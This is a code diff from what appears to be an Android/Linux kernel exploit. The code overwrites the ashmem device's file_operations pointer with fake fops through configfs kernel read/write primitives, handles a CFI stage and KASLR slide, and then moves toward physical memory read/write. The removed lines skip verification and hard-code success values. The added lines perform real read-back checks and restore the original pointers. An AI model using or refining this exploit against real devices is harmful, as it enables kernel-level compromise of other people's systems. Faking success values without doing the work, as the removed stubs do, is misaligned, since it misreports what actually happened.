@@ -185,9 +185,13 @@ void do_pselect_fake_lock_route(void) {
 
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
+  uint64_t after = 0;
   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
   ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
-  return wr == (ssize_t)sizeof(llseek);
+  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
+  return wr == (ssize_t)sizeof(llseek) &&
+         rd == (ssize_t)sizeof(after) &&
+         after == llseek;
 }
 
 int restore_slide_boot_id(int fd) {
@@ -243,6 +247,7 @@ int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
   int dirty = 0;
+  int can_read_back = 0;
 
   if (fd < 0) {
     cfi_last_step = 11;
@@ -251,33 +256,82 @@ int try_cfi_stage(void) {
   }
 
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
-  // APP 模式下跳过 configfs 读取验证，FOPS 劫持已由物理写入窗口证实
-  pr_info("cfi skip configfs read verify, fops write triggered\n");
+  uint64_t pre_fops = 0;
+  ssize_t pre_rb = configfs_read_once(
+      fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
+               "read=%016llx want=%016zx errno=%d\n",
+               pre_rb, misc_fops, (unsigned long long)pre_fops,
+               fake_fops, errno);
+    fops_before = pre_fops;
+    cfi_last_step = 4;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
-  // 跳过测试写入，直接标记 dirty 并修复 llseek
-  cfi_write_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
+  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
+  ssize_t n =
+    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
+  cfi_write_ret = n;
+  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
+  if (n != (ssize_t)sizeof(payload)) {
+    cfi_last_step = 1;
+    cfi_last_errno = errno;
+    goto fail;
+  }
   dirty = 1;
   cfi_dirty_seen = 1;
-  pr_info("cfi skip test write, proceed to repair llseek\n");
 
-  repair_fake_fops_llseek(fd);
+  if (!repair_fake_fops_llseek(fd)) {
+    cfi_last_step = 2;
+    cfi_last_errno = errno;
+    goto fail;
+  }
   cfi_read_slot_ret = sizeof(uint64_t);
-  pr_info("cfi skip llseek repair verify\n");
+  can_read_back = 1;
 
-  // APP 模式下跳过回读验证
-  cfi_read_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
-  pr_info("cfi skip readback verify\n");
+  char readback[sizeof(payload)];
+  memset(readback, 0, sizeof(readback));
+  ssize_t r =
+    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
+  cfi_read_ret = r;
+  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
+  if (r != (ssize_t)sizeof(readback) ||
+      memcmp(readback, payload, sizeof(payload)) != 0) {
+    cfi_last_step = 3;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  // APP 模式下 configfs 不可用，跳过 P0 oracle 页面恢复
-  pr_info("cfi skip restore_p0_oracle_pages in app mode\n");
+  if (!restore_p0_oracle_pages(fd)) {
+    cfi_last_step = 10;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 #endif
 
-  // APP 模式下跳过 FOPS 恢复，直接进入 pipe physrw
-pr_info("cfi skip fops restore (app mode), proceed to pipe physrw\n");
-cfi_restore_ret = sizeof(uint64_t);
-  // APP 模式下跳过 fops 恢复读取验证
-  pr_info("cfi skip fops restore read verify\n");
+  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
+          misc_fops, (unsigned long long)original_fops);
+  ssize_t restore = configfs_write_once(
+      fd, misc_fops, &original_fops, sizeof(original_fops));
+  cfi_restore_ret = restore;
+  if (restore != (ssize_t)sizeof(original_fops)) {
+    cfi_last_step = 5;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
+  uint64_t before = 0;
+  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
+  fops_before = before;
+  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
+    cfi_last_step = 6;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
   if (!restore_slide_boot_id(fd)) {
@@ -326,17 +380,30 @@ cfi_restore_ret = sizeof(uint64_t);
     goto fail;
   }
 
-  // APP 模式下跳过最终读取验证
-  fops_after = canon_addr(ASHMEM_FOPS);
-  pr_info("cfi skip final fops read verify\n");
+  uint64_t after = 0;
+  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
+  fops_after = after;
+  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
+    cfi_last_step = 6;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
-  // APP 模式下跳过最终清理和验证
-cfi_owner_ret = sizeof(uint64_t);
-SYSCHK(close(fd));
-cfi_last_step = 0;
-cfi_last_errno = 0;
-atomic_store(&cfi_stage_done, 1);
-return 1;
+  uint64_t null_owner = 0;
+  ssize_t owner =
+    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
+  cfi_owner_ret = owner;
+  SYSCHK(close(fd));
+  if (owner == (ssize_t)sizeof(null_owner) &&
+      restore == (ssize_t)sizeof(original_fops)) {
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    atomic_store(&cfi_stage_done, 1);
+    return 1;
+  }
+  cfi_last_step = 7;
+  cfi_last_errno = errno;
+  return 0;
 
 fail:
   if (dirty) {
@@ -346,6 +413,14 @@ fail:
     }
     cfi_restore_ret = configfs_write_once(
         fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
+    if (can_read_back &&
+        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
+      uint64_t after_fail = 0;
+      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
+          (ssize_t)sizeof(after_fail)) {
+        fops_after = after_fail;
+      }
+    }
     uint64_t null_owner_fail = 0;
     cfi_owner_ret = configfs_write_once(
         fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
